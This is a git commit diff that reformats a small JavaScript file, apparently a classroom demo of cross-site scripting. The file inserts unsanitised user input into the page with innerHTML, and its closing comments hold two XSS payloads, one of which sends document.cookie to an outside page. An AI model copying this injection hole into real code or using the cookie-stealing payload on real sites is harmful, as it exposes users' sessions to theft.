09ab35842823c575ab9d4e239bf7f5403e616304
garevna <garevna@mail.ru>
2024-05-28 06:37:41 +0300

    Update index03.js

--- js/index03.js
+++ js/index03.js
@@ -2,17 +2,17 @@ document.cookie = "userName=Irina"
 document.cookie = "vblastvisit=1522413993"
 document.cookie = "disqus_unique=780rb5t8pt6mg"
 
-function testUserText ( userText ) {
-      return userText
+function testUserText (userText) {
+  return userText
 }
-function insertUserText ( userText ) {
-      var x = document.createElement ( 'div' )
-      x.innerHTML = testUserText ( userText )
-      document.body.appendChild ( x )
+function insertUserText (userText) {
+  var x = document.createElement('div')
+  x.innerHTML = testUserText(userText)
+  document.body.appendChild(x)
 }
 
-document.querySelector ( 'input' ).onchange = function ( event ) {
-        insertUserText ( event.target.value )
+document.querySelector('input').onchange = function (event) {
+  insertUserText(event.target.value)
 }
 // <IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>
 // <IFRAME SRC=js/attack.html onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self')"></IFRAME>
